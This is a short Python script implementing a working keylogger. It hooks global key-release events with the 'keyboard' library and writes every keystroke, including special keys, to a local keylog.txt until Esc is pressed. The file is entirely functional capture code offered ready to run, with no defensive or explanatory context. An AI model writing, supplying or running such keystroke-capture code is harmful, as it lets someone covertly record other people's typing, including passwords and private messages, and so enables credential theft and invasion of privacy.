import keyboard # type: ignore
def keylogger():
    log_file = "keylog.txt"
    
    # Clear previous log file
    open(log_file, "w").close()
    
    print("Keylogger started. Press 'Esc' to stop.")

    # Start recording keystrokes
    keyboard.on_release(callback=lambda event: write_to_log(event, log_file))

    # Wait for 'Esc' key to stop the keylogger
    keyboard.wait('esc')

    print("Keylogger stopped.")

def write_to_log(event, log_file):
    # Open log file in append mode and write the pressed key
    with open(log_file, "a") as f:
        key = event.name
        if len(key) > 1:
            # Special keys
            if key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            else:
                f.write(f"[{key}]")
        else:
            # Normal alphanumeric keys
            f.write(key)

# Run the keylogger
if __name__ == "__main__":
    keylogger()
